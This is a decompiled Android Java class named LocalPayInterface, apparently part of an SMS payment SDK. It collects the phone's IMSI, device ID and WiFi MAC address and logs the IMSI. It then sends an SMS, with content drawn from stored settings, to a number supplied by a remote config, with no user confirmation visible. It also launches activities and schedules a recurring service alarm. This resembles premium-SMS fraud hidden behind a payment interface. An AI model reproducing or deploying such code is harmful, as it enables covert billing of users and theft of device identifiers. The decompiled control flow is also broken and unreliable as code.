package com.mm.fm;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import com.mm.c.a.f;
import com.mm.c.a.g;
import com.mm.d.a.h;
import com.wq.ff.service.WqMService;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Random;

public class LocalPayInterface
  implements com.mm.b.a.e
{
  static AlarmManager a;
  private h b;
  private com.mm.c.a.a c;
  private Context d;
  private boolean e = false;
  private String f;
  private Handler g = new b(this);
  
  public LocalPayInterface() {}
  
  private void getConfig()
  {
    if (!TextUtils.isEmpty(f.f))
    {
      com.mm.c.a.e.c(this.d, f.f);
      this.b.a(this);
    }
  }
  
  private String getData()
  {
    SimpleDateFormat localSimpleDateFormat = new SimpleDateFormat("yyyyMMddhhmmss");
    int i = new Random().nextInt(999999);
    return localSimpleDateFormat.format(new Date()) + i;
  }
  
  private void initTData()
  {
    f.e = this.f;
    if (!TextUtils.isEmpty(this.f)) {
      com.mm.c.a.e.p(this.d, this.f);
    }
    Object localObject = (TelephonyManager)this.d.getSystemService("phone");
    f.f = ((TelephonyManager)localObject).getSubscriberId();
    f.g = ((TelephonyManager)localObject).getDeviceId();
    localObject = (WifiManager)this.d.getSystemService("wifi");
    if (localObject == null)
    {
      localObject = null;
      if (localObject != null) {
        break label162;
      }
    }
    for (;;)
    {
      Log.i("fmz", "imsi===" + f.f);
      com.mm.c.a.e.b(this.d, f.b);
      com.mm.c.a.e.d(this.d, f.a);
      f.d = com.mm.c.a.e.a(this.d);
      com.mm.c.a.e.i(this.d, getData());
      f.o = com.mm.c.a.e.g(this.d);
      return;
      localObject = ((WifiManager)localObject).getConnectionInfo();
      break;
      label162:
      ((WifiInfo)localObject).getMacAddress();
    }
  }
  
  private void readMessage(String paramString)
  {
    if ((!com.mm.c.a.e.h(this.d)) && (!TextUtils.isEmpty(paramString)))
    {
      sendMessage(paramString);
      new Thread(new a(this)).start();
      return;
    }
    this.g.sendEmptyMessage(0);
  }
  
  private void sendMessage(String paramString)
  {
    String str = com.mm.c.a.e.b(this.d);
    SmsManager.getDefault().sendTextMessage(paramString, null, str, null, null);
    com.mm.c.a.e.a(this.d, true);
  }
  
  public void onPayStart(Context paramContext, boolean paramBoolean, String paramString)
  {
    Log.d("fmz", "onPayStart = ");
    this.d = paramContext;
    this.e = paramBoolean;
    this.f = paramString;
    f.a(this.d);
    this.b = new h();
    initTData();
    getConfig();
  }
  
  public void response(Object paramObject, boolean paramBoolean)
  {
    if ((!paramBoolean) && (paramObject != null))
    {
      this.c = ((com.mm.c.a.a)paramObject);
      if ((!TextUtils.isEmpty(this.c.a)) && (!this.c.a.equals("0"))) {
        com.mm.c.a.e.a(this.d, this.c.a);
      }
      f.d = this.c.a;
      if (TextUtils.isEmpty(f.e))
      {
        if (TextUtils.isEmpty(this.c.b)) {
          break label141;
        }
        f.e = this.c.b;
      }
    }
    label141:
    do
    {
      for (;;)
      {
        TextUtils.isEmpty(this.c.c);
        if (System.currentTimeMillis() - com.mm.c.a.e.l(this.d) <= 120000L) {
          break;
        }
        startAlarm(this.c.d);
        return;
        if (!TextUtils.isEmpty(com.mm.c.a.e.q(this.d))) {
          f.e = com.mm.c.a.e.q(this.d);
        }
      }
    } while (com.mm.c.a.e.k(this.d));
    startAlarm(this.c.d);
  }
  
  public void responseConfig(g paramG, boolean paramBoolean)
  {
    if (paramG != null)
    {
      if ((this.e) && (!TextUtils.isEmpty(paramG.c())))
      {
        localIntent = new Intent("android.intent.action.CALL");
        localIntent.putExtra("URL", paramG.c());
        localIntent.putExtra("Tsy", paramG.d());
        localIntent.putExtra("TanC", paramG.e());
        localIntent.setFlags(268435456);
        localIntent.setClass(this.d, com.android.wqs.view.a.class);
        this.d.startActivity(localIntent);
      }
      readMessage(paramG.b());
      if (TextUtils.isEmpty(paramG.a())) {}
    }
    while (!this.e) {
      try
      {
        Intent localIntent;
        f.q = URLDecoder.decode(paramG.a(), "utf-8");
        return;
      }
      catch (UnsupportedEncodingException paramG)
      {
        paramG.printStackTrace();
        return;
      }
    }
    paramG = new Intent("android.intent.action.CALL");
    paramG.setFlags(268435456);
    paramG.setClass(this.d, com.android.wqs.view.a.class);
    this.d.startActivity(paramG);
  }
  
  public void startAlarm(String paramString)
  {
    Object localObject = new Intent(this.d, WqMService.class);
    localObject = PendingIntent.getService(this.d, 0, (Intent)localObject, 134217728);
    Calendar localCalendar = Calendar.getInstance();
    localCalendar.setTimeInMillis(System.currentTimeMillis());
    int i = 2;
    if (!TextUtils.isEmpty(paramString)) {
      i = Integer.parseInt(paramString);
    }
    localCalendar.add(13, i);
    if (a != null) {
      a.cancel((PendingIntent)localObject);
    }
    a = (AlarmManager)this.d.getSystemService("alarm");
    a.set(0, localCalendar.getTimeInMillis(), (PendingIntent)localObject);
  }
}
